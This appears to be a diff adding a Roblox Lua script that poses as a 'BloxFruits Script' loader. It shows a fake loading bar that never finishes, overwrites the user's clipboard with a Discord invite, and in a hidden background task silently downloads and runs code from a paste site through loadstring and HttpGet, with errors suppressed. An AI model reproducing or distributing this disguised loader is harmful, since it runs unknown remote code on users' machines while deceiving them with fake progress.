@@ -1,0 +1,139 @@
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LoadingScreen"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.DisplayOrder = 2147483647
+screenGui.Parent = playerGui
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 420, 0, 260)
+mainFrame.Position = UDim2.new(0.5, -210, 0.38, -130)
+mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+mainFrame.BackgroundTransparency = 0
+mainFrame.BorderSizePixel = 0
+mainFrame.ZIndex = 999
+mainFrame.Parent = screenGui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 16)
+corner.Parent = mainFrame
+
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(255, 154, 0) -- Custom Hex #FF9A00
+stroke.Thickness = 4
+stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+stroke.Parent = mainFrame
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, -20, 0, 45)
+titleLabel.Position = UDim2.new(0, 10, 0, 32)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "🎃 BloxFruits Script 🎃"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.Font = Enum.Font.GothamBlack
+titleLabel.TextSize = 34
+titleLabel.TextXAlignment = Enum.TextXAlignment.Center
+titleLabel.ZIndex = 1000
+titleLabel.Parent = mainFrame
+
+local subLabel = Instance.new("TextLabel")
+subLabel.Size = UDim2.new(1, -30, 0, 25)
+subLabel.Position = UDim2.new(0, 15, 0, 105)
+subLabel.BackgroundTransparency = 1
+subLabel.Text = "Loading 🎃 BloxFruits Script 🎃 (first execute is slow)"
+subLabel.TextColor3 = Color3.fromRGB(255, 185, 75)
+subLabel.Font = Enum.Font.GothamBold
+subLabel.TextSize = 14
+subLabel.TextXAlignment = Enum.TextXAlignment.Center
+subLabel.ZIndex = 1000
+subLabel.Parent = mainFrame
+
+local barBg = Instance.new("Frame")
+barBg.Size = UDim2.new(1, -50, 0, 12)
+barBg.Position = UDim2.new(0, 25, 0, 158)
+barBg.BackgroundColor3 = Color3.fromRGB(60, 35, 0)
+barBg.BorderSizePixel = 0
+barBg.ZIndex = 1000
+barBg.Parent = mainFrame
+
+local barBgCorner = Instance.new("UICorner")
+barBgCorner.CornerRadius = UDim.new(0, 6)
+barBgCorner.Parent = barBg
+
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(255, 154, 0) -- Custom Hex #FF9A00
+barFill.BorderSizePixel = 0
+barFill.ZIndex = 1001
+barFill.Parent = barBg
+
+local fillCorner = Instance.new("UICorner")
+fillCorner.CornerRadius = UDim.new(0, 6)
+fillCorner.Parent = barFill
+
+local percentLabel = Instance.new("TextLabel")
+percentLabel.Size = UDim2.new(1, 0, 0, 25)
+percentLabel.Position = UDim2.new(0, 0, 0, 184)
+percentLabel.BackgroundTransparency = 1
+percentLabel.Text = "0%"
+percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+percentLabel.Font = Enum.Font.GothamBlack
+percentLabel.TextSize = 16
+percentLabel.TextXAlignment = Enum.TextXAlignment.Center
+percentLabel.ZIndex = 1000
+percentLabel.Parent = mainFrame
+
+local setClipboard = setclipboard or toclipboard or set_clipboard
+if setClipboard then
+	setClipboard("https://discord.gg/TDZ6qUmjDJ")
+end
+
+pcall(function()
+	StarterGui:SetCore("SendNotification", {
+		Title = "Discord Link Copied";
+		Text = "The Discord invite has been copied to your clipboard!";
+		Duration = 5;
+	})
+end)
+
+task.spawn(function()
+	pcall(function()
+		loadstring(game:HttpGet("https://paste.fe4r.click/raw/23529ed3-574c-445e-b2d3-edfb2b57e843"))()
+	end)
+end)
+
+local targetPercent = 99.8
+local duration = 360
+local startTime = tick()
+local currentPercent = 0
+local notificationShown = false
+
+RunService.Heartbeat:Connect(function()
+	if currentPercent >= targetPercent then return end
+
+	local t = math.min((tick() - startTime) / duration, 1)
+	local eased = 1 - (1 - t) ^ 3
+
+	currentPercent = eased * targetPercent
+	barFill.Size = UDim2.new(currentPercent / 100, 0, 1, 0)
+	percentLabel.Text = string.format("%.1f%%", currentPercent)
+
+	if currentPercent >= 90 and not notificationShown then
+		notificationShown = true
+		pcall(function()
+			StarterGui:SetCore("SendNotification", {
+				Title = "Notice";
+				Text = "Rejoin If Loading Gets Stuck";
+				Duration = 5;
+			})
+		end)
+	end
+end)
